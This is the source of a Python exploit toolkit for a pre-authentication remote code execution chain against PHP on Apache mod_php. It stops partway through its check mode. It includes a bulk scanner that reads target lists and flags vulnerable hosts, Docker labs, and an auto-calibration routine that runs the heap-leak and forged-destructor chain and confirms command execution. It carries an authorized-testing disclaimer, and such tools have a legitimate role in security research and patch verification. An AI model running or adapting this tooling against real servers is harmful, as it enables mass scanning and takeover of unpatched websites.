#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-109618 / CVE-2026-109619 — php2shell PoC.

Modes:
  check   — passive GET fingerprint; single URL or bulk target list.
  exploit — one-shot RCE against PHP 8.4.26 + Apache mod_php prefork.

Exploit chain (pure HTTP, no target-side PHP required):
  Stage 0  Worker rotation via OOM + session init crash
  Stage 1  Set-Cookie heap leak        -> Zend MM chunk base
  Stage 2  Set-Cookie libphp leak      -> libphp base (ZVAL_PTR_DTOR)
  Stage 3  upload_progress fake-ref    -> pDestructor = zif_system -> RCE

Exploit target requirements:
  display_errors=1, memory_limit=8M, max_input_vars=1000,
  session.use_cookies=1, session.use_strict_mode=0,
  session.upload_progress.enabled=1, single-worker prefork.

Use only against systems you own or are authorized to test.
Command-line arguments are visible in process listings and shell history.

Credits (per-feature, not per-contributor; see README for full list):
  * Wiz Research -- discovery and public analysis of PHP2Shell
    (CVE-2026-109618 / CVE-2026-109619).
    https://www.wiz.io/blog/php2shell-php-rce
  * 9bie -- original public exploit primitive: Set-Cookie heap leak,
    libphp leak via nTableSize, forged pDestructor = zif_system via
    upload_progress. Stages 1-3 here are a Python port of that chain.
    https://github.com/9bie/php2shell-bypass-aslr-exp
  * Calif -- upload-metadata amplification analysis.
    https://calif.io/php2shell/
  * Karasawa2025 -- display_errors=Off research direction (not shipped
    here).
  * WoYinDao -- session lifecycle and pre-RINIT OOM window analysis.
  * Sansec -- public technical writeup.
    https://sansec.io/research/php2shell
  * devploit -- version-aware dispatcher, one-shot memory_limit probe,
    build-profile factory and per-feature credits style this toolkit
    borrows from. https://github.com/devploit/php2shell
  * PHP security team, PHP Foundation and release maintainers --
    advisory and fixes in 8.2.35 / 8.3.36 / 8.4.27 / 8.5.12.
  * godylockz -- this Python port: single-file check + exploit modes,
    bulk fingerprint, docker lab, auto-offset extraction, bookworm/lab
    calibration profiles, sh</out/c command staging.
"""

# Imports
import argparse
import http.client
import json
import os
import re
import socket
import ssl
import struct
import subprocess
import sys
import threading
import time
import urllib.parse
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# Constants
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
BOLD = "\033[1m"
ENDC = "\033[0m"


# Styled progress: timed tag lines. pline() writes through Target.log()
# so --quiet still mutes it; banner() prints unconditionally.

def _format_elapsed(t0):
    d = time.monotonic() - t0
    return "%02d:%05.2f" % (int(d // 60), d % 60)


def _colorize(code, s, enabled):
    return f"{code}{s}{ENDC}" if enabled else s


def pline(target, tag, msg, color=BLUE):
    """Timed, tagged, color-gated progress line.

    Format: '00:00.02  TAG      msg'. Honors Target.color (set from
    --no-color / tty check) and Target.verbose (--quiet).
    """
    tagged = _colorize(color, tag.ljust(9), target.color)
    target.log(f"{_format_elapsed(target.t0)}  {tagged} {msg}")


def banner(color_enabled=True):
    def c(code, s):
        return f"{code}{s}{ENDC}" if color_enabled else s
    print(c(BOLD, "  php2shell  ·  CVE-2026-109618 / CVE-2026-109619"))
    print("  one-shot pre-auth RCE  ·  Apache mod_php prefork")
    print(c(YELLOW, "  authorized testing only"))
    print()


FATAL_MB_RE = re.compile(
    rb"Allowed memory size of (\d+) bytes exhausted", re.I)

MAX_CMD = 14
SID = b"attacksessionid0001"
HERE = os.path.dirname(os.path.abspath(__file__))
PROFILES_DIR = os.path.join(HERE, "profiles")
PROFILE_ALIASES = {
    "bookworm": "php-8.4.26-bookworm-amd64",
    "lab": "php-lab",
}

# Labs: one container per PHP version. Last-known-vulnerable patch of each
# branch, mounted on 127.0.0.1 only. New entries go here; no scanning.
LABS = [
    {"name": "p2s-lab-7433", "image": "php:7.4-apache",
     "port": 8104, "php_version": "7.4.33"},
    {"name": "p2s-lab-8030", "image": "php:8.0-apache",
     "port": 8105, "php_version": "8.0.30"},
    {"name": "p2s-lab-8134", "image": "php:8.1-apache",
     "port": 8106, "php_version": "8.1.34"},
    {"name": "p2s-lab-8234", "image": "php:8.2.34-apache",
     "port": 8100, "php_version": "8.2.34"},
    {"name": "p2s-lab-8333", "image": "php:8.3.33-apache",
     "port": 8109, "php_version": "8.3.33"},
    {"name": "p2s-lab-8335", "image": "php:8.3.35-apache",
     "port": 8101, "php_version": "8.3.35"},
    {"name": "p2s-lab-8425", "image": "php:8.4.25-apache",
     "port": 8107, "php_version": "8.4.25"},
    {"name": "p2s-lab-8426", "image": "php:8.4.26-apache",
     "port": 8102, "php_version": "8.4.26"},
    {"name": "p2s-lab-8511", "image": "php:8.5.11-apache",
     "port": 8103, "php_version": "8.5.11"},
    # WordPress needs MySQL -> compose-based lab. The container name here
    # must match the one in docker/labs/wordpress/docker-compose.yml so
    # labs_status/test can inspect it by name.
    {"name": "p2s-lab-wp", "compose": "docker/labs/wordpress",
     "port": 8108, "php_version": "8.3.13",
     "image": "wordpress:6.6.2-php8.3-apache"},
]

FIX_VERSIONS = {
    "8.2": (8, 2, 35),
    "8.3": (8, 3, 36),
    "8.4": (8, 4, 27),
    "8.5": (8, 5, 12),
}


# ---- profile catalog (profiles/*.json) ----
#
# A profile is a per-build calibration: offsets, stage params, oom size and
# a verified-RCE flag. Profiles live under profiles/ as JSON. See
# profiles/php-8.4.26-bookworm-amd64.json for the schema. New builds get a
# new JSON (eventually generated by the `calibrate` subcommand).


def _parse_hex(v):
    if isinstance(v, int):
        return v
    if isinstance(v, str):
        return int(v, 0)
    raise ValueError(f"not an int or hex string: {v!r}")


def load_profile(path):
    """Load one profile JSON, normalize hex-string offsets to ints and
    stage3_pads lists to tuples. Raises ValueError on bad schema."""
    with open(path, "r", encoding="utf-8") as f:
        data = json.load(f)
    for key in ("name", "stages", "offsets"):
        if key not in data:
            raise ValueError(f"profile missing {key!r}: {path}")
    data["offsets"] = {k: _parse_hex(v) for k, v in data["offsets"].items()}
    pads = data["stages"].get("stage3_pads", [])
    data["stages"]["stage3_pads"] = [tuple(p) for p in pads]
    return data


def load_all_profiles():
    """Return profiles sorted by name; silently skips malformed files."""
    if not os.path.isdir(PROFILES_DIR):
        return []
    out = []
    for fname in sorted(os.listdir(PROFILES_DIR)):
        if not fname.endswith(".json"):
            continue
        try:
            out.append(load_profile(os.path.join(PROFILES_DIR, fname)))
        except (OSError, json.JSONDecodeError, ValueError, KeyError):
            continue
    return out


def find_profile(name_or_version, arch=None, profiles=None):
    """Resolve a profile by name, legacy alias, or (php_version + arch).

    Returns the profile dict or None. Backwards-compat aliases:
      --profile bookworm -> php-8.4.26-bookworm-amd64
      --profile lab      -> php-lab
    """
    if profiles is None:
        profiles = load_all_profiles()
    target = PROFILE_ALIASES.get(name_or_version, name_or_version)
    for p in profiles:
        if p.get("name") == target:
            return p
    for p in profiles:
        if p.get("php_version") == name_or_version:
            if arch is None or p.get("arch") == arch:
                return p
    return None


def detect_container_arch(container):
    """Return 'amd64' or 'aarch64' from `docker exec CONTAINER uname -m`,
    or None if docker is unavailable / the container does not exist."""
    try:
        r = subprocess.run(
            ["docker", "exec", container, "uname", "-m"],
            capture_output=True, timeout=5, text=True,
        )
    except (OSError, subprocess.SubprocessError):
        return None
    m = (r.stdout or "").strip()
    if m in ("x86_64", "amd64"):
        return "amd64"
    if m in ("aarch64", "arm64"):
        return "aarch64"
    return None


def dispatch_profile(fp, args, profiles):
    """Pick a profile from CLI args + preflight fingerprint.

    Returns (profile, source) on success, or (None, reason) on failure.
    Resolution order: --profile > --php-version > preflight version.
    """
    if args.profile:
        p = find_profile(args.profile, args.arch, profiles)
        if not p:
            return None, f"profile {args.profile!r} not in profiles/"
        return p, f"--profile {p['name']}"
    if args.php_version:
        p = find_profile(args.php_version, args.arch, profiles)
        if not p:
            arch_str = f" / {args.arch}" if args.arch else ""
            return None, f"no profile for PHP {args.php_version}{arch_str}"
        return p, f"--php-version {args.php_version}"
    ver = (fp or {}).get("php_version") if fp else None
    if ver and not ver.endswith("?"):
        p = find_profile(ver, args.arch, profiles)
        if p:
            return p, f"preflight PHP {ver}"
    return None, (
        "no profile matched; pass --profile NAME, "
        "or --php-version X.Y.Z (and --arch for remote targets)"
    )


def do_list_profiles(profiles, color_enabled):
    """Tabulate the profile catalog with calibrated-RCE status."""
    def c(code, s):
        return f"{code}{s}{ENDC}" if color_enabled else s
    print(c(BOLD, f"{'NAME':40}  {'PHP':8}  {'ARCH':8}  {'RCE':4}  NOTES"))
    for p in profiles:
        name = p.get("name", "?")
        ver = p.get("php_version") or "-"
        arch = p.get("arch") or "-"
        rce_ok = bool(p.get("rce_verified"))
        rce = c(GREEN, "yes") if rce_ok else c(YELLOW, "no ")
        notes = p.get("notes", "")
        print(f"{name:40}  {ver:8}  {arch:8}  {rce}   {notes}")
    if not profiles:
        print("(no profiles found under profiles/)")
    return 0


def do_dry_run(args, profile, source, t):
    """Add stage-param details to the lines the setup block already printed,
    then exit without sending any exploit traffic."""
    st = profile["stages"]
    pline(t, "STAGE 1",
          f"heap leak with stage1_n={st['stage1_n']}")
    pline(t, "STAGE 2",
          f"libphp leak with stage2_t={st['stage2_t']}  "
          f"stage2_v={st['stage2_v']}")
    pline(t, "STAGE 3",
          f"RCE with stage3_carrier={st['stage3_carrier']}  "
          f"pads={st['stage3_pads']}")
    pline(t, "DRY-RUN", "no exploit traffic sent", color=YELLOW)
    return 0


# ---- labs (docker orchestration) ----
#
# Each entry in LABS maps to a `docker run` with the shared docker/php.ini
# and docker/apache.conf mounted read-only, and out/ mounted at /out so
# the proof file lands where the exploit's --fetch and --proof-file expect.


def _docker_run(argv, timeout=10):
    """Run a docker CLI command, returning (rc, stdout, stderr)."""
    try:
        r = subprocess.run(argv, capture_output=True, text=True,
                           timeout=timeout)
        return r.returncode, r.stdout, r.stderr
    except (OSError, subprocess.SubprocessError) as e:
        return 1, "", str(e)


def container_state(name):
    """Return 'running', 'stopped' or 'absent' for `name`."""
    rc, out, _ = _docker_run(
        ["docker", "inspect", "-f", "{{.State.Running}}", name])
    if rc != 0:
        return "absent"
    return "running" if out.strip() == "true" else "stopped"


def _http_probe(host, port, path="/index.php", timeout=3):
    """GET host:port/path, return HTTP status as a string or 'ERR'."""
    try:
        conn = http.client.HTTPConnection(host, port, timeout=timeout)
        conn.request("GET", path, headers={"Connection": "close"})
        status = conn.getresponse().status
        conn.close()
        return str(status)
    except Exception:
        return "ERR"


def labs_up(args, color_enabled):
    """Start every lab in LABS that isn't already running."""
    def c(code, s):
        return f"{code}{s}{ENDC}" if color_enabled else s
    docker_dir = os.path.join(HERE, "docker")
    out_dir = os.path.join(HERE, "out")
    www_dir = os.path.join(docker_dir, "www")
    os.makedirs(out_dir, exist_ok=True)

    missing = [p for p in (
        os.path.join(docker_dir, "php.ini"),
        os.path.join(docker_dir, "apache.conf"),
        www_dir,
    ) if not os.path.exists(p)]
    if missing:
        print(c(RED, f"[-] missing config: {', '.join(missing)}"))
        return 2

    rc = 0
    for lab in LABS:
        name, port = lab["name"], lab["port"]
        image = lab.get("image", "")
        state = container_state(name)
        if state == "running":
            print(c(YELLOW, f"[-] {name:16} already running on :{port}"))
            continue
        if state == "stopped":
            _docker_run(["docker", "rm", "-f", name])

        if lab.get("compose"):
            compose_file = os.path.join(
                HERE, lab["compose"], "docker-compose.yml")
            if not os.path.exists(compose_file):
                print(c(RED, f"[-] {name:16} compose file missing"))
                rc = 1
                continue
            r_rc, _, err = _docker_run(
                ["docker", "compose", "-f", compose_file, "up", "-d"],
                timeout=180)
            if r_rc == 0:
                print(c(GREEN, f"[+] {name:16} up on :{port}  "
                               f"({image}, compose)"))
            else:
                print(c(RED, f"[-] {name:16} compose up failed: "
                             f"{err.strip()[:200]}"))
                rc = 1
            continue

        # Mount configs as conf.d / conf-enabled drop-ins so the base image's
        # MPM and module loading stay intact (mirrors docker-compose.yml).
        cmd = [
            "docker", "run", "-d", "--name", name,
            "-p", f"127.0.0.1:{port}:80",
            "-v", f"{docker_dir}/php.ini:"
                  f"/usr/local/etc/php/conf.d/zz-php2shell.ini:ro",
            "-v", f"{docker_dir}/apache.conf:"
                  f"/etc/apache2/conf-enabled/zz-php2shell.conf:ro",
            "-v", f"{www_dir}:/var/www/html:ro",
            "-v", f"{out_dir}:/out:rw",
            "--restart", "unless-stopped",
            image,
            "/bin/sh", "-c",
            "chown -R www-data:www-data /out 2>/dev/null || true; "
            "exec apache2-foreground",
        ]
        r_rc, _, err = _docker_run(cmd, timeout=60)
        if r_rc == 0:
            print(c(GREEN, f"[+] {name:16} up on :{port}  ({image})"))
        else:
            print(c(RED, f"[-] {name:16} failed: {err.strip()[:200]}"))
            rc = 1
    return rc


def labs_down(args, color_enabled):
    """Remove every lab container in LABS. Compose labs use `compose down -v`."""
    def c(code, s):
        return f"{code}{s}{ENDC}" if color_enabled else s
    for lab in LABS:
        name = lab["name"]
        if lab.get("compose"):
            compose_file = os.path.join(
                HERE, lab["compose"], "docker-compose.yml")
            if container_state(name) == "absent" and not os.path.exists(
                    compose_file):
                print(c(YELLOW, f"[-] {name:16} not present"))
                continue
            r_rc, _, err = _docker_run(
                ["docker", "compose", "-f", compose_file, "down", "-v"],
                timeout=60)
            if r_rc == 0:
                print(c(GREEN, f"[+] {name:16} compose down"))
            else:
                print(c(RED, f"[-] {name:16} compose down failed: "
                             f"{err.strip()[:200]}"))
            continue
        if container_state(name) == "absent":
            print(c(YELLOW, f"[-] {name:16} not present"))
            continue
        r_rc, _, err = _docker_run(["docker", "rm", "-f", name])
        if r_rc == 0:
            print(c(GREEN, f"[+] {name:16} removed"))
        else:
            print(c(RED, f"[-] {name:16} rm failed: {err.strip()[:200]}"))
    return 0


def labs_status(args, color_enabled):
    """Print a table of lab name / image / port / state / HTTP status."""
    def c(code, s):
        return f"{code}{s}{ENDC}" if color_enabled else s
    header = f"{'NAME':16}  {'IMAGE':24}  {'PORT':5}  {'STATE':8}  HTTP"
    print(c(BOLD, header))
    for lab in LABS:
        name, image, port = lab["name"], lab["image"], lab["port"]
        state = container_state(name)
        state_c = (GREEN if state == "running"
                   else YELLOW if state == "stopped" else RED)
        http = _http_probe("127.0.0.1", port) if state == "running" else "-"
        http_c = (GREEN if http.startswith("2")
                  else RED if http not in ("-", "ERR") else YELLOW)
        print(f"{name:16}  {image:24}  {port:<5}  "
              f"{c(state_c, state.ljust(8))}  {c(http_c, http)}")
    return 0


def labs_test(args, color_enabled):
    """Reachability + preflight-version + profile-exists check per lab.

    Non-exploit sanity check: does not fire the chain. Confirms the lab is
    serving the expected PHP version and that a profile exists to drive it.
    """
    def c(code, s):
        return f"{code}{s}{ENDC}" if color_enabled else s
    profiles = load_all_profiles()
    overall_ok = True
    for lab in LABS:
        name, port = lab["name"], lab["port"]
        want_ver = lab["php_version"]
        if container_state(name) != "running":
            print(c(YELLOW, f"[-] {name:16} not running"))
            overall_ok = False
            continue

        url = f"http://127.0.0.1:{port}/index.php"
        fp = http_get_fingerprint(url, timeout=5.0)
        got_ver = fp.get("php_version") or "?"
        arch = detect_container_arch(name) or "amd64"
        prof = (find_profile(got_ver, arch, profiles)
                if got_ver != "?" else None)

        bits = [f"PHP={got_ver}"]
        if got_ver != want_ver and got_ver != "?":
            bits.append(c(YELLOW, f"(expected {want_ver})"))
        verdict = "ready"
        if prof:
            rce_ok = bool(prof.get("rce_verified"))
            bits.append(c(GREEN if rce_ok else YELLOW,
                          f"profile={prof['name']}"
                          f" rce={'verified' if rce_ok else 'unverified'}"))
            if not rce_ok:
                verdict = "unverified"
        else:
            bits.append(c(YELLOW, "no profile; needs calibration"))
            verdict = "needs-calibration"
            overall_ok = False
        tag = {
            "ready":              c(GREEN, "[+] READY"),
            "unverified":         c(YELLOW, "[~] UNV  "),
            "needs-calibration":  c(YELLOW, "[~] CAL  "),
        }[verdict]
        print(f"{tag}  {name:16}  {'  '.join(bits)}")
    return 0 if overall_ok else 1


# ---- calibrate (profile generator with proof verification) ----
#
# Pragmatic calibration: try existing profiles' stage params against the new
# target first (fast; works when the layout matches), then a bounded sweep.
# Writes profiles/php-X.Y.Z-DISTRO-ARCH.json. `rce_verified` is written true
# only after a real command proof lands in out/p1; false if only the leaks
# succeeded (the build needs stage-3 research the sweep didn't cover).


def _extract_libphp_offsets(container, lib_path, quiet):
    """Run docker/offsets.py against a container; return {zif, dtor} or None.
    Falls back to libphp7.so for PHP 7.x images that don't ship libphp.so."""
    offsets_file = os.path.join(HERE, "out", "offsets.env")
    os.makedirs(os.path.dirname(offsets_file), exist_ok=True)
    candidates = [lib_path]
    if lib_path.endswith("/libphp.so"):
        candidates.append(lib_path.replace("/libphp.so", "/libphp7.so"))
    for path in candidates:
        r_rc, _, _ = _docker_run([
            sys.executable, os.path.join(HERE, "docker", "offsets.py"),
            "--container", container,
            "--lib-in-container", path,
            "--output", offsets_file,
        ], timeout=30)
        if r_rc != 0:
            continue
        env = read_offsets_file(offsets_file)
        if "ZIF_OFFSET" in env and "DTOR_OFFSET" in env:
            return {"zif": env["ZIF_OFFSET"], "dtor": env["DTOR_OFFSET"]}
    return None


def _calibration_candidates():
    """Candidate stage-param sets ordered by likelihood of hitting.

    Starts with existing calibrated profiles (fast path for close-neighbor
    builds, e.g. 8.5.11 using the 8.4.26 bookworm layout), then a bounded
    sweep around them for near-neighbor drift.
    """
    seen = set()
    out = []

    def push(c):
        key = (c["stage1_n"], c["stage2_t"], c["stage2_v"],
               c["stage3_carrier"], c.get("stage3_prime_cookie", False),
               c.get("htdata_offset"))
        if key in seen:
            return
        seen.add(key)
        out.append(c)

    # 1. Known-good profiles first
    for prof in load_all_profiles():
        st = prof["stages"]
        push({
            "stage1_n": st["stage1_n"],
            "stage2_t": st["stage2_t"],
            "stage2_v": st["stage2_v"],
            "stage3_pads": list(st["stage3_pads"]),
            "stage3_carrier": st["stage3_carrier"],
            "stage3_prime_cookie": st.get("stage3_prime_cookie", False),
            "htdata_offset": prof["offsets"]["htdata_offset"],
        })

    # 2. Bounded sweep around the bookworm layout (8.4.x neighbors)
    for n in (820, 841, 860, 880, 892, 910, 930):
        for t_ in (400, 406, 420, 440, 443):
            for v in (1, 8, 16):
                push({
                    "stage1_n": n,
                    "stage2_t": t_,
                    "stage2_v": v,
                    "stage3_pads": [(31, 31)] * 6,
                    "stage3_carrier": True,
                    "stage3_prime_cookie": True,
                    "htdata_offset": 0x690D8,
                })
    return out[:40]  # cap exploration; each candidate is ~5-10 seconds


def _try_candidate(t, cand, zif, dtor, quiet):
    """Run one calibration candidate end-to-end. Returns a dict:
      {stage1: int|0, stage2: int|0, stage3_proof: str|''}
    """
    profile_stub = {
        "stages": {
            "stage1_n": cand["stage1_n"],
            "stage2_t": cand["stage2_t"],
            "stage2_v": cand["stage2_v"],
            "stage3_pads": cand["stage3_pads"],
            "stage3_carrier": cand["stage3_carrier"],
            "stage3_prime_cookie": cand["stage3_prime_cookie"],
        },
        "offsets": {
            "zif_offset": zif,
            "dtor_offset": dtor,
            "htdata_offset": cand["htdata_offset"],
        },
    }
    ex = Exploit(t, "id>/out/p1", zif_offset=zif, dtor_offset=dtor,
                 htdata_offset=cand["htdata_offset"],
                 huge_mb=12, verbose=not quiet, profile=profile_stub)
    out = {"stage1": 0, "stage2": 0, "stage3_proof": "", "candidate": cand}

    ex.rotate()
    chunk = ex.stage1()
    out["stage1"] = chunk
    if not chunk:
        return out

    ex.rotate()
    libphp = ex.stage2()
    out["stage2"] = libphp
    if not libphp:
        return out

    ex.rotate()
    htdata = chunk + cand["htdata_offset"]
    zif_abs = libphp + zif
    proof_file = os.path.join(HERE, "out", "p1")
    try:
        if os.path.exists(proof_file):
            os.unlink(proof_file)
    except OSError:
        pass

    for _ in range(4):
        try:
            ex.stage3(htdata, zif_abs)
        except OSError:
            pass
        time.sleep(0.8)
        if os.path.exists(proof_file):
            try:
                with open(proof_file, "rb") as f:
                    body = f.read().decode("latin1").strip()
                if body:
                    out["stage3_proof"] = body
                    return out
            except OSError:
                pass
        ex.rotate()
    return out


def run_calibrate(args):
    """Auto-calibrate stage params for a new build; write profile JSON."""
    if not args.url:
        print(f"{RED}[-] calibrate mode requires -u/--url{ENDC}",
              file=sys.stderr)
        return 2
    if not args.docker_container:
        print(f"{RED}[-] calibrate mode requires --docker-container{ENDC}",
              file=sys.stderr)
        return 2

    color_enabled = not args.no_color and sys.stdout.isatty()
    t = Target(args.url, timeout=args.timeout, verbose=not args.quiet,
               color=color_enabled)
    if not args.quiet:
        banner(color_enabled=color_enabled)

    pline(t, "TARGET",
          f"{args.url}  (container={args.docker_container})")

    # Preflight for the PHP version
    fp = http_get_fingerprint(args.url, timeout=args.timeout)
    ver = fp.get("php_version") or args.php_version or "unknown"
    if ver == "unknown":
        pline(t, "FAIL",
              "could not read PHP version; pass --php-version", color=RED)
        return 2
    pline(t, "OK",
          f"Server: {fp.get('server') or '?'}  ·  PHP {ver}", color=GREEN)

    # Offsets from the container
    pline(t, "OFFSETS",
          f"extracting from "
          f"{args.docker_container}:{args.lib_in_container}")
    syms = _extract_libphp_offsets(
        args.docker_container, args.lib_in_container, args.quiet)
    if not syms:
        pline(t, "FAIL",
              "libphp offset extraction failed; is the container running?",
              color=RED)
        return 1
    pline(t, "OK",
          f"zif=0x{syms['zif']:x}  dtor=0x{syms['dtor']:x}", color=GREEN)

    arch = (args.arch
            or detect_container_arch(args.docker_container)
            or "amd64")
    distro = args.distro or "bookworm"
    profile_name = f"php-{ver}-{distro}-{arch}"
    pline(t, "PROFILE", f"will write {profile_name}.json on success")

    candidates = _calibration_candidates()
    pline(t, "SWEEP",
          f"{len(candidates)} candidates (known profiles + bounded sweep)")

    best = None
    for i, cand in enumerate(candidates, 1):
        pline(t, f"CAND {i}",
              f"stage1_n={cand['stage1_n']}  "
              f"stage2={cand['stage2_t']}x{cand['stage2_v']}  "
              f"carrier={cand['stage3_carrier']}")
        r = _try_candidate(t, cand, syms["zif"], syms["dtor"], args.quiet)
        if r["stage3_proof"]:
            pline(t, "OK",
                  f"RCE confirmed: {r['stage3_proof'][:80]}", color=GREEN)
            best = r
            break
        if r["stage2"] and (best is None or not best["stage2"]):
            pline(t, "PARTIAL",
                  f"leaks ok (chunk+libphp), stage 3 missed", color=YELLOW)
            best = r
        elif r["stage1"]:
            pline(t, "MISS",
                  f"stage 1 only (chunk=0x{r['stage1']:x})", color=YELLOW)
        else:
            pline(t, "MISS", "stage 1 failed", color=YELLOW)

    if not best:
        pline(t, "FAIL", "no candidate produced a usable leak", color=RED)
        return 1

    cand = best["candidate"]
    rce_ok = bool(best["stage3_proof"])
    data = {
        "name": profile_name,
        "php_version": ver,
        "distro": distro,
        "arch": arch,
        "image": args.image or "",
        "apache_version": None,
        "stages": {
            "stage1_n": cand["stage1_n"],
            "stage2_t": cand["stage2_t"],
            "stage2_v": cand["stage2_v"],
            "stage3_pads": [list(p) for p in cand["stage3_pads"]],
            "stage3_carrier": cand["stage3_carrier"],
            "stage3_prime_cookie": cand["stage3_prime_cookie"],
        },
        "offsets": {
            "zif_offset": f"0x{syms['zif']:x}",
            "dtor_offset": f"0x{syms['dtor']:x}",
            "htdata_offset": f"0x{cand['htdata_offset']:x}",
        },
        "oom_mb": 12,
        "rce_verified": rce_ok,
        "notes": (
            f"Auto-calibrated against "
            f"{args.image or args.docker_container}. "
            f"chunk=0x{best['stage1']:x} libphp=0x{best['stage2']:x}"
            + (" (RCE verified)" if rce_ok else " (leaks only; stage 3 open)")
        ),
    }
    os.makedirs(PROFILES_DIR, exist_ok=True)
    out_path = os.path.join(PROFILES_DIR, f"{profile_name}.json")
    # Refuse to overwrite an existing rce_verified profile unless --force.
    if os.path.exists(out_path) and not args.force:
        try:
            existing = load_profile(out_path)
        except (OSError, ValueError, json.JSONDecodeError):
            existing = None
        if existing and existing.get("rce_verified"):
            pline(t, "SKIP",
                  f"{out_path} already exists with rce_verified=true; "
                  f"pass --force to overwrite", color=YELLOW)
            return 0 if rce_ok else 1
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2)
        f.write("\n")
    pline(t, "WROTE", out_path, color=GREEN if rce_ok else YELLOW)
    return 0 if rce_ok else 1


def run_labs(args):
    """Dispatch `labs <action>` to labs_up / down / status / test."""
    color_enabled = not args.no_color and sys.stdout.isatty()
    rc, _, _ = _docker_run(["docker", "--version"], timeout=5)
    if rc != 0:
        print(f"{RED}[-] docker CLI not available{ENDC}" if color_enabled
              else "[-] docker CLI not available", file=sys.stderr)
        return 2
    action = args.action or "status"
    actions = {
        "up": labs_up,
        "down": labs_down,
        "status": labs_status,
        "test": labs_test,
    }
    fn = actions.get(action)
    if not fn:
        print(f"{RED}[-] unknown labs action: {action!r} "
              f"(expected: up / down / status / test){ENDC}",
              file=sys.stderr)
        return 2
    return fn(args, color_enabled)


# ---- check mode (passive fingerprint) ----


def parse_php_version(text):
    if not text:
        return None, False
    m = re.search(r"PHP\s*/?\s*(\d+)\.(\d+)(?:\.(\d+))?", text, re.I)
    if not m:
        return None, False
    major, minor = int(m.group(1)), int(m.group(2))
    patch_known = m.group(3) is not None
    patch = int(m.group(3)) if patch_known else 0
    if major < 4 or major > 8:
        return None, False
    if major == 8 and minor > 5:
        return None, False
    return (major, minor, patch), patch_known


def is_vulnerable(ver, patch_known=True):
    if ver is None:
        return None
    if not patch_known:
        return None
    major, minor, patch = ver
    key = f"{major}.{minor}"
    fix = FIX_VERSIONS.get(key)
    if fix is None:
        return True if major >= 5 else False
    return ver < fix


def http_get_fingerprint(url, timeout=10.0, proxy=None):
    u = urllib.parse.urlsplit(url if "://" in url else "https://" + url)
    scheme = (u.scheme or "https").lower()
    host = u.hostname or "127.0.0.1"
    port = u.port or (443 if scheme == "https" else 80)
    path = u.path or "/"

    row = {
        "target": url, "http_status": 0, "x_powered_by": "",
        "server": "", "php_version": None, "likely_vulnerable": None,
    }

    try:
        if proxy:
            pu = urllib.parse.urlsplit(proxy)
            phost = pu.hostname or "127.0.0.1"
            pport = pu.port or 8080
            if scheme == "https":
                conn = http.client.HTTPSConnection(
                    phost, pport, timeout=timeout,
                    context=ssl._create_unverified_context(),
                )
                conn.set_tunnel(host, port)
            else:
                conn = http.client.HTTPConnection(
                    phost, pport, timeout=timeout,
                )
                path = f"http://{host}:{port}{path}"
        elif scheme == "https":
            conn = http.client.HTTPSConnection(
                host, port, timeout=timeout,
                context=ssl._create_unverified_context(),
            )
        else:
            conn = http.client.HTTPConnection(
                host, port, timeout=timeout,
            )

        conn.request("GET", path, headers={
            "Host": host,
            "User-Agent": "php2shell-check/1.0",
            "Connection": "close",
        })
        resp = conn.getresponse()
        row["http_status"] = resp.status
        row["x_powered_by"] = resp.getheader("X-Powered-By", "")
        row["server"] = resp.getheader("Server", "")
        body = resp.read(8192).decode("latin1", "replace")
        conn.close()
    except Exception as e:
        row["error"] = f"{type(e).__name__}: {e}"
        return row

    ver, patch_known = parse_php_version(row["x_powered_by"])
    source = "header"
    if ver is None:
        ver, patch_known = parse_php_version(body)
        source = "body" if ver else None

    if ver:
        major, minor, patch = ver
        row["php_version"] = (
            f"{major}.{minor}.{patch}" if patch_known
            else f"{major}.{minor}.?"
        )
        row["likely_vulnerable"] = is_vulnerable(ver, patch_known)
        row["version_source"] = source

    return row


def classify_check(fp):
    if not fp.get("http_status"):
        return "unreachable"
    if not fp.get("php_version"):
        return "no_php_version"
    lv = fp.get("likely_vulnerable")
    if lv is True:
        return "likely_vulnerable"
    if lv is False:
        return "patched"
    return "unknown_patch"


def platform_guard(fp):
    """Decline reason if a fingerprint shows an unsupported target, else None.

    The exploit needs Apache mod_php prefork on Linux. Positive evidence of
    Windows, IIS, or a non-mod_php SAPI is a decline; a stripped or absent
    Server token is inconclusive and never blocks.
    """
    server = (fp.get("server") or "").lower()
    xpb = (fp.get("x_powered_by") or "").lower()
    shown = fp.get("server") or "(none)"
    if "microsoft-iis" in server or "asp.net" in xpb:
        return f"IIS/ASP.NET target (Server: {shown}); needs Apache mod_php prefork on Linux"
    if "win32" in server or "win64" in server:
        return f"Windows Apache build (Server: {shown}); exploit is Linux-only"
    if "nginx" in server:
        return f"nginx target (Server: {shown}); PHP runs as FPM/FastCGI, not mod_php prefork"
    return None


def load_targets(path):
    lines = Path(path).read_text(encoding="utf-8", errors="replace").splitlines()
    out = []
    skip = {"domain", "host", "url", "target"}
    for line in lines:
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        token = line.split(",")[0].split()[0].strip()
        if token.lower() in skip:
            continue
        url = token if "://" in token else "https://" + token
        out.append(url)
    seen = set()
    return [u for u in out if not (u in seen or seen.add(u))]


def run_check(args):
    targets = []
    if args.file:
        targets.extend(load_targets(args.file))
    if args.url:
        url = args.url if "://" in args.url else "https://" + args.url
        targets.append(url)
    if not targets:
        print(f"{RED}[-] provide URL or -f/--file{ENDC}", file=sys.stderr)
        return 2

    seen = set()
    targets = [u for u in targets if not (u in seen or seen.add(u))]
    total = len(targets)
    workers = min(args.workers, total)
    rows = []
    out_path = Path(args.output) if args.output else None
    if out_path:
        out_path.write_text("", encoding="utf-8")

    proxy = getattr(args, "proxy", None)

    def _one(url):
        return http_get_fingerprint(url, timeout=args.timeout, proxy=proxy)

    def _report(fp, n):
        st = classify_check(fp)
        fp["status"] = st
        ver = fp.get("php_version") or "?"
        host = fp.get("target", "?")
        if st == "likely_vulnerable":
            tag = f"{RED}[VULNERABLE]{ENDC}"
        elif st == "patched":
            tag = f"{GREEN}[PATCHED]{ENDC}"
        elif st == "unreachable":
            tag = f"{RED}[UNREACHABLE]{ENDC}"
        else:
            tag = f"{YELLOW}[{st.upper()}]{ENDC}"
        if not args.quiet:
            prefix = f"[{n}/{total}] " if total > 1 else ""
            print(f"{prefix}{tag} {host}  PHP {ver}", flush=True)
        if out_path:
            with open(out_path, "a", encoding="utf-8") as fh:
